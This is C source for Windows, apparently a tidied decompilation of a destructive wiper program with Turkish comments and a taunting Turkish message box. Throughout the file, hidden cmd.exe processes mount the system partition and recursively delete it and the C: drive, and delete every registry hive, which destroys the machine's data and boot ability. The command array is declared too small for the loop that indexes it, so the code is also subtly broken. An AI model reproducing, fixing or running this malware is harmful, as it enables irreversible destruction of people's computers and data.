#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>  // true/false için

// Tanımlamaları düzeltme
typedef unsigned int uint;
typedef unsigned long long ulonglong;
typedef unsigned long long undefined8;

BOOL BVar1;
STARTUPINFOA local_f8;
PROCESS_INFORMATION local_88;
char *local_68[4];
char *local_48;
char *local_40;
char *local_38;
char *local_30;
char *local_28;
char *local_20;
uint local_c;

// MinGW otomatik olarak global constructor ve destructor yönetimini halleder
// Bu nedenle __do_global_ctors veya __main fonksiyonlarını kendimiz tanımlamıyoruz.

void ShowMessageAndExecuteCommands(void)
{
    // Display a message box with a custom string (Address placeholders are likely part of decompiled data)
    MessageBoxA((HWND)0x0, "PC'inle son dakikalar\nya da birazdan GG olacak!", "Warning", 0x30);

    // Define the command strings to be executed
    local_68[0] = "cmd.exe /c mountvol x: /s";    // Mount the system partition to drive X:
    local_68[1] = "cmd.exe /c icacls x:";         // Modify access control for drive X:
    local_68[2] = "cmd.exe /c icacls c:";         // Modify access control for drive C:
    local_68[3] = "cmd.exe /c rd x: /s /q";       // Remove the drive X: recursively and quietly

    local_48 = "cmd.exe /c reg delete HKCR /f";   // Delete registry key HKCR
    local_40 = "cmd.exe /c reg delete HKCU /f";   // Delete registry key HKCU
    local_38 = "cmd.exe /c reg delete HKLM /f";   // Delete registry key HKLM
    local_30 = "cmd.exe /c reg delete HKU /f";    // Delete registry key HKU
    local_28 = "cmd.exe /c reg delete HKCC /f";   // Delete registry key HKCC
    local_20 = "cmd.exe /c rd c: /s /q";          // Remove the drive C: recursively and quietly

    local_c = 0;  // Initialize command counter

    // Loop through the command list and execute each command
    while (true)
    {
        if (local_c > 9)  // If command index exceeds 9, stop execution
        {
            return;
        }

        // Set up the STARTUPINFOA structure for process creation
        memset(&local_f8, 0, sizeof(local_f8));  // Zero out the structure
        local_f8.cb = sizeof(local_f8);  // Set the structure size
        local_f8.dwFlags = 1;            // Set the flags (use STARTF_USESHOWWINDOW)
        local_f8.wShowWindow = 0;        // Do not show the window

        // Zero out the PROCESS_INFORMATION structure
        memset(&local_88, 0, sizeof(local_88));

        // Create the process with the command
        BVar1 = CreateProcessA((LPCSTR)0x0, local_68[local_c], NULL, NULL, 0, 0, NULL, NULL, &local_f8, &local_88);

        // If process creation fails, break the loop
        if (BVar1 == 0) break;

        // Wait for the process to finish
        WaitForSingleObject(local_88.hProcess, INFINITE);

        // Close the handles after process execution
        CloseHandle(local_88.hProcess);
        CloseHandle(local_88.hThread);

        // Move to the next command in the list
        local_c = local_c + 1;
    }

    // Display an error message box if something goes wrong
    MessageBoxA((HWND)0x0, "Error", "Hata", 0x10);
    return;
}

// Main entry point
int main(int _Argc, char **_Argv, char **_Env)
{
    ShowMessageAndExecuteCommands();  // Show message and execute commands
    return 0;
}
